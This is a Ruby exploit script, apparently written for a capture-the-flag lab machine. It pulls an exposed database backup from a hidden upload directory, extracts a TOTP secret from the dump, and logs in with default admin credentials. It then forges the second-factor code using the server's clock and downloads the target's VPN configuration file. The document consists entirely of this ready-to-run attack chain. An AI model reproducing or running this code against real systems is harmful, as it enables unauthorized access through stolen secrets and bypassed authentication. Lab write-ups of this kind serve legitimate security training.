#!/usr/bin/env ruby

require 'rotp'
require 'time'
require 'uri'
require 'zlib'

require 'net/http'

sql_file = 'db.sql'
gz_file = "#{sql_file}.gz"
tmp = "tmp_#{gz_file}"
ovpn_file = 'static.ovpn'
host = '10.10.10.246:8080'
totp = ''

puts "[*] Downloading corrupted #{gz_file} file"

url = URI("http://#{host}/.ftp_uploads/#{gz_file}")
res = Net::HTTP.get(url)
File.binwrite(gz_file, res)

File.open(gz_file, 'rb') { |f| File.binwrite(tmp, f.read.gsub("\r\n", "\n")) }

Zlib::GzipReader.open(tmp) do |f|
  sql = f.read.strip
  puts "[+] Patched #{gz_file} file. Found #{sql_file}:\n\n#{sql}"

  File.open(sql_file, 'w') { |ff| ff.write(sql) }

  totp = sql.scan(/'(.*?)'/).last.first
  puts "\n[+] Using TOTP key: #{totp}"
end

File.delete(tmp)

url = URI("http://#{host}/vpn/login.php")
res = Net::HTTP.post(url, 'username=admin&password=admin&submit=Login')
cookie = res['Set-Cookie']
server_time = Time.parse(res['Date']).to_i
puts '[+] Login successful'

code = ROTP::TOTP.new(totp).at(server_time)
puts "[*] Generating TOTP code: #{code}"

res = Net::HTTP.post(url, "code=#{code}", { Cookie: cookie })
location = res['Location']

puts "[+] 2FA successful. Go to http://#{host}/vpn/#{location}"
puts "[+] Cookie: #{cookie}"
puts '[*] Downloading OVPN file...'

url = URI("http://#{host}/vpn/#{location}")
res = Net::HTTP.post(url, 'cn=static', { Cookie: cookie })

File.open(ovpn_file, 'w') { |f| f.write(res.body) }

puts "[+] Downloaded OVPN file: #{ovpn_file}"
